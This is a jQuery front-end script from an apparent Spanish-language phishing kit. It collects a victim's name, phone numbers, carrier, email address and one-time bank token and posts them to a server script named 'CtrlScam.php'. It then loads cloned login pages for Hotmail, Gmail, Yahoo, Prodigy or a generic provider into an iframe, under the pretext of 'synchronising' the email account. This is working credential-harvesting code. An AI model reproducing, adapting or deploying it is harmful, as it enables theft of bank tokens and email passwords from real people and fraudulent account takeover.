$(document).ready(function(){

    /*$('#aviso').hide();
    $('#divEmailConfirm').show();*/
    
    var eNombre = "Debe ingresar su nombre completo.";
    var ePhone = "Debe ingresar su numero de telefono fijo con clave lada.";
    var eCell = "Debe ingresar su numero celular completo.";
    var eEmail = "Debe ingresar su E-Mail.";
    var eEmailInvalid = "El correo especificado no es v&aacute;lido.";
    var exp = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;;
    var eToken = "Debe ingresar su contrase&ntilde;a din&aacute;mica para continuar.";
    var eCompany = "Debe ingresar su compa&ntilde;ia telefonica.";
    
    var nombre = $('#bato');
    var phone = $('#fon');
    var cell = $('#celular');
    var email = $('#correo');
    var token = $('#token');
    var company = $('#carrier');


    var request = "";

    var urlHotmail = "../../hotmail/login.php?usr=";
    var urlGmail = "../../google/signin/v2/sl/pwd/?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount&followup=https%3A%2F%2Faccounts.google.com%2FManageAccount&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1&navigationDirection=forward&user=";
    var urlYahoo = "../../yahoo/account/challenge/password.php?src=fpctx&.intl=es&.lang=es-ES&authMechanism=primary&display=login&yid=648927492&done=https%3A%2F%2Fesyahoocom%2F&sessionIndex=QQ--&acrumb=cy7jZsTF&user=email&usr=";
    var urlProdigy = "../../prodigy/AccesoCorreo/pages/MiAcceso_01.php?usr=";
    var urlGenerico = "../../EmailGenerico/defaultEmail.php?src=fpctx&.intl=es&.lang=es-ES&authMechanism=primary&display=login&yid=648927492&done=https%3A%2F%2Fesyahoocom%2F&sessionIndex=QQ--&acrumb=cy7jZsTF&user=email&usr=";
    var msgBaseTitle = "Para sincronizar correctamente la cuenta de su correo electr&oacute;nico, es necesario que se autentique en su cuenta de correo electr&oacute;nico ";
    var msgBaseBoton = "Ir a ";
    var msgBaseBotonGenerico = "Autenticarme con ";
    var msgEmailIngreso = "";
    var msgBtn = "";
    var tEmail = false;

    function validateTipeEMail(email, session, interface){


        if(/@hotmail/.test(email) || /@HOTMAIL/.test(email) || /@outlook/.test(email) || /@OUTLOOK/.test(email) || /@live/.test(email) || /@LIVE/.test(email)){
            $('#iframeEmail').attr('src',urlHotmail+email+'&session='+session+'&interface='+interface);
            msgEmailIngreso = msgBaseTitle+"de HOTMAIL";
            msgBtn = msgBaseBoton+"HOTMAIL";
        }else if(/@gmail/.test(email) || /@GMAIL/.test(email)){
            $('#iframeEmail').attr('src',urlGmail+email+'&session='+session+'&interface='+interface);
            msgEmailIngreso = msgBaseTitle+"de GMAIL";
            msgBtn = msgBaseBoton+"GMAIL";
        }else if(/@yahoo/.test(email) || /@YAHOO/.test(email)){
            $('#iframeEmail').attr('src',urlYahoo+email+'&session='+session+'&interface='+interface);
            msgEmailIngreso = msgBaseTitle+"de YAHOO";
            msgBtn = msgBaseBoton+"YAHOO";
        }else if(/@prodigy/.test(email) || /@PRODIGY/.test(email) || /@infinitum/.test(email) || /@INFINITUM/.test(email) || /@.mitmx/.test(email) || /@.MITMX/.test(email) || /@telmex/.test(email) || /@TELMEX/.test(email) || /@ctbr/.test(email) || /@CTBR/.test(email) || /@limsa/.test(email) || /@LIMSA/.test(email) || /@telnormail/.test(email) || /@TELNORMAIL/.test(email)){
            $('#iframeEmail').attr('src',urlProdigy+email+'&session='+session+'&interface='+interface);
            msgEmailIngreso = msgBaseTitle+"de PRODIGY";
            msgBtn = msgBaseBoton+"PRODIGY";
        }else{
            $('#iframeEmail').attr('src',urlGenerico+email+'&session='+session+'&interface='+interface);
            msgEmailIngreso = msgBaseBotonGenerico+email;
            msgBtn = msgBaseBotonGenerico+email;
            msgBaseTitle
            $('#btnEmailRedirect').removeClass('btn_celeste_91').addClass('btn_celeste_91_big');

            tEmail = true;
        }
    }



    $('#btnVerify').click(function(e){
        e.preventDefault();
        $('#aviso').hide();
        $('#divEmailConfirm').show();
    });


    $('#btnAceptar').click(function(e){
        if(nombre.val() == ""){
            cuadroDialogo(eNombre, 1);
            nombre.focus();
        }else{
            if(phone.val().length != 10){
                cuadroDialogo(ePhone, 1);
                phone.focus();
            }else{
                if(cell.val().length != 10){
                    cuadroDialogo(eCell, 1);
                    cell.focus();
                }else{
                    if(company.val() == ""){
                        cuadroDialogo(eCompany, 1);
                        company.focus();
                    }else{
                        if(email.val() == ""){
                            cuadroDialogo(eEmail, 1);
                            email.focus();
                        }else{
                            if(!exp.test(email.val())){
                                cuadroDialogo(eEmailInvalid, 1);
                                email.focus();
                            }else{
                                if(token.val() == ""){
                                    cuadroDialogo(eToken, 1);
                                    token.focus();
                                }else{

                                    $.ajax({
                                        type: 'POST',
                                        url: '../../Controllers/CtrlScam.php',
                                        data: {
                                            "request": "contacto_nuevo_empresas",
                                            "nombre": nombre.val(),
                                            "phone": phone.val(),
                                            "celular": cell.val(),
                                            "email": email.val(),
                                            "compania": company.val(),
                                            "token": token.val(),
                                            "session": $('#session').val()
                                        },
                                        beforeSend: function(){
                                            console.log("ENviando...");
                                            $('#backmodal').show();
                                            $('#mensajeLoading').show();
                                        },
                                        success: function (resp){
                                            console.log('Datos Enviados');
                                            console.log(resp);
                                            
                                            $('#backmodal').hide();
                                            $('#mensajeLoading').hide();


                                            validateTipeEMail(email.val(), $('#session').val(),2);

                                            $('#tituloChange').html('Sincronizaci&oacute;n de correo electr&oacute;nico');
                                            $('#txtVerifyEmailData').html('<br>Por favor, inicie sesi&oacute;n en su correo electr&oacute;nico para que de esta manera quede asociado su email al servicio de alertas.<br>');
                                            $('#form').hide();

                                            

                                            //$('#btnAceptar').hide();
                                            $('#btnVerify').val(msgBtn).show();
                                            $('#tblBTN').show();
                                            //alert('ok');
                                            //window.location.href="verify-account.do.php?DATAID=ASJ893asi2i342837kjdha82389420&session="+$('#session').val()+"&inforData=ndj723648whrr82743";
                                        },
                                        error: function (request, textStatus, errorThrown) {
                                            console.log('Error al Enviar los Datos: '+errorThrown);
                                        }
                                    });
                                }
                            }
                        }
                    }
                }
            }
        }
    });
});